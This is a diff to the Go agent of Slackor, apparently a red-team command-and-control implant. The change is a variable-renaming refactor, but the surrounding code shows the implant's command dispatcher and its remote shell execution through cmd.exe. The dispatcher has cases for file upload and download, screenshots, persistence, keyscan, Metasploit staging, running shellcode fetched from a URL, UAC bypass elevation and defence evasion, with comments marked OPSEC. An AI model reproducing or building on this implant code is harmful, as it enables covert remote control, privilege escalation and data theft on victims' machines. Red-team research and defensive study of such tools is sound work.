@@ -28,6 +28,8 @@ import (
 	"time"
 	"unsafe"
 
+	"github.com/Coalfire-Research/Slackor/pkg/command"
+
 	_ "github.com/Coalfire-Research/Slackor/pkg/common"
 
 	"github.com/atotto/clipboard"
@@ -1654,8 +1656,8 @@ func CheckCommands(t, client_ID string) { //This is the main thing, reads the co
 		stringSlice := strings.Split(Message.Text, ":")
 		clientID := stringSlice[0]
 		jobID := stringSlice[1]
-		cmd_type := stringSlice[2]
-		command := stringSlice[3]
+		cmdType := stringSlice[2]
+		encCmd := stringSlice[3]
 		//If the client_ID is for me (or all agents)
 		if clientID == client_ID || clientID == "31337" {
 			//And this job has not yet been processed
@@ -1664,10 +1666,10 @@ func CheckCommands(t, client_ID string) { //This is the main thing, reads the co
 				processed_ids = append(processed_ids, jobID)
 				fmt.Println(processed_ids)
 				/// Run stuff based on type
-				switch cmd_type {
+				switch cmdType {
 
 				case "command":
-					data, err := Decrypt(command)
+					data, err := Decrypt(encCmd)
 					if err != nil {
 						log.Fatal("error:", err)
 					}
@@ -1678,7 +1680,7 @@ func CheckCommands(t, client_ID string) { //This is the main thing, reads the co
 					os.Exit(3)
 
 				case "sleep":
-					data, err := Decrypt(command)
+					data, err := Decrypt(encCmd)
 					if err != nil {
 						log.Fatal("error:", err)
 					}
@@ -1687,7 +1689,7 @@ func CheckCommands(t, client_ID string) { //This is the main thing, reads the co
 					time.Sleep(time.Duration(sleeptime) * time.Second)
 
 				case "upload":
-					data, err := Decrypt(command)
+					data, err := Decrypt(encCmd)
 					if err != nil {
 						log.Fatal("error:", err)
 					}
@@ -1704,7 +1706,7 @@ func CheckCommands(t, client_ID string) { //This is the main thing, reads the co
 					go TakeScreenShot(clientID, jobID)
 
 				case "beacon":
-					data, err := Decrypt(command)
+					data, err := Decrypt(encCmd)
 					if err != nil {
 						log.Fatal("error:", err)
 					}
@@ -1712,7 +1714,7 @@ func CheckCommands(t, client_ID string) { //This is the main thing, reads the co
 					beacon, _ = strconv.Atoi(string(data))
 
 				case "download":
-					data, err := Decrypt(command)
+					data, err := Decrypt(encCmd)
 					if err != nil {
 						log.Fatal("error:", err)
 					}
@@ -1720,7 +1722,7 @@ func CheckCommands(t, client_ID string) { //This is the main thing, reads the co
 					upload_file(clientID, jobID, string(data))
 
 				case "persist":
-					data, err := Decrypt(command)
+					data, err := Decrypt(encCmd)
 					if err != nil {
 						log.Fatal("error:", err)
 					}
@@ -1728,7 +1730,7 @@ func CheckCommands(t, client_ID string) { //This is the main thing, reads the co
 					go persistence(string(data))
 
 				case "clean":
-					data, err := Decrypt(command)
+					data, err := Decrypt(encCmd)
 					if err != nil {
 						log.Fatal("error:", err)
 					}
@@ -1744,7 +1746,7 @@ func CheckCommands(t, client_ID string) { //This is the main thing, reads the co
 					Register(client_ID)
 
 				case "keyscan":
-					data, err := Decrypt(command)
+					data, err := Decrypt(encCmd)
 					if err != nil {
 						log.Fatal("error:", err)
 					}
@@ -1758,7 +1760,7 @@ func CheckCommands(t, client_ID string) { //This is the main thing, reads the co
 
 				case "metasploit":
 					if runtime.GOARCH != "386" {
-						data, err := Decrypt(command)
+						data, err := Decrypt(encCmd)
 						if err != nil {
 							log.Fatal("error:", err)
 						}
@@ -1771,7 +1773,7 @@ func CheckCommands(t, client_ID string) { //This is the main thing, reads the co
 					}
 				case "shellcode": // Execute shellcode from a URL
 					if runtime.GOARCH != "386" {
-						data, err := Decrypt(command)
+						data, err := Decrypt(encCmd)
 						if err != nil {
 							log.Fatal("error:", err)
 						}
@@ -1787,7 +1789,7 @@ func CheckCommands(t, client_ID string) { //This is the main thing, reads the co
 					go duplicate()
 
 				case "elevate":
-					data, err := Decrypt(command)
+					data, err := Decrypt(encCmd)
 					if err != nil {
 						log.Fatal("error:", err)
 					}
@@ -1795,7 +1797,7 @@ func CheckCommands(t, client_ID string) { //This is the main thing, reads the co
 					go bypassUAC(string(data))
 
 				case "defanger":
-					data, err := Decrypt(command)
+					data, err := Decrypt(encCmd)
 					if err != nil {
 						log.Fatal("error:", err)
 					}
@@ -1812,13 +1814,13 @@ func CheckCommands(t, client_ID string) { //This is the main thing, reads the co
 	return
 }
 
-func RunCommand(client_id, job_id, command string) { //This receives a command to run and runs it
+func RunCommand(client_id, job_id, rawCmd string) { //This receives a command to run and runs it
 	var err error
 	cmdName := "cmd.exe"
 	cmd := exec.Command(cmdName)
 	//Check if the command has multiple params
-	if strings.ContainsAny(command, " ") {
-		args := strings.SplitN(command, " ", 2)
+	if strings.ContainsAny(rawCmd, " ") {
+		args := strings.SplitN(rawCmd, " ", 2)
 		switch args[0] {
 		// OPSEC - Perform alternate actions to avoid calling cmd.exe
 		case "cd":
@@ -1873,7 +1875,7 @@ func RunCommand(client_id, job_id, command string) { //This receives a command t
 		default:
 			cmdArgs := []string{"/c", args[0], args[1]}
 			cmd = exec.Command(cmdName, cmdArgs...)
-			fmt.Println("Running command: " + command)
+			fmt.Println("Running command: " + rawCmd)
 			var out bytes.Buffer
 			var stderr bytes.Buffer
 			cmd.Stdout = &out
@@ -1890,7 +1892,7 @@ func RunCommand(client_id, job_id, command string) { //This receives a command t
 		}
 	} else {
 		//OPSEC - Perform alternate actions to avoid calling cmd.exe
-		switch command {
+		switch rawCmd {
 		case "pwd":
 			mydir, err := os.Getwd()
 			if err == nil {
@@ -1936,9 +1938,9 @@ func RunCommand(client_id, job_id, command string) { //This receives a command t
 			SendResult(client_id, job_id, "output", encryptedOutput)
 
 		default:
-			cmdArgs := []string{"/c", command}
+			cmdArgs := []string{"/c", rawCmd}
 			cmd = exec.Command(cmdName, cmdArgs...)
-			fmt.Println("Running command: " + command)
+			fmt.Println("Running command: " + rawCmd)
 			var out bytes.Buffer
 			var stderr bytes.Buffer
 			cmd.Stdout = &out
@@ -1953,7 +1955,6 @@ func RunCommand(client_id, job_id, command string) { //This receives a command t
 				SendResult(client_id, job_id, "output", encryptedOutput)
 			}
 		}
-
 	}
 }
 
